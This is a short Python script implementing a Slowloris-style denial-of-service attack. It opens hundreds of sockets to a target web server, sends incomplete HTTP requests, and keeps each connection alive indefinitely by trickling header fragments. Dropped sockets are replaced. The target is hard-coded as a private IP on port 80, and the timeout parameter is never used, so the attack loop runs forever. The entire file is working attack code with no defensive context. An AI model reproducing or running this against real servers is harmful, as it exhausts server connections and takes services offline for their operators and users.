import socket
import random
import time
import sys


class DOS_Attack():
    # class initialization
    def __init__(self, ip, port=80, sockets_count=200):
        self._ip = ip
        self._port = port
        # store all newly created sockets as a list.
        self._sockets = [self.new_socket() for _ in range(sockets_count)]

    def get_message(self, message):
        # returns message format
        return (message + "{} HTTP/1.1\r\n".format(str(random.randint(0, 2000)))).encode("utf-8")

    # creates a new socket and return it.
    def new_socket(self):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(4)
            s.connect((self._ip, self._port))
            s.send(self.get_message("Get /?"))
            return s
        except socket.error as se:
            print("Error: "+str(se))
            time.sleep(0.5)
            return self.new_socket()

    def attack(self, timeout=sys.maxsize, sleep=15):
        # loop until timeout
        i = 0
        while True:
            for s in self._sockets:
                try:
                    print("Sending request count : #{}".format(str(i)))
                    s.send(self.get_message("X-a: "))
                    i += 1
                except socket.error:
                    self._sockets.remove(s)
                    self._sockets.append(self.new_socket())
                time.sleep(sleep/len(self._sockets))


# driver method.
if __name__ == "__main__":
    target_ip_address = "172.18.0.1"
    target_port = 80
    sockets_count = 500
    dos = DOS_Attack(target_ip_address, port=target_port, sockets_count=sockets_count)
    dos.attack(timeout=60*10)
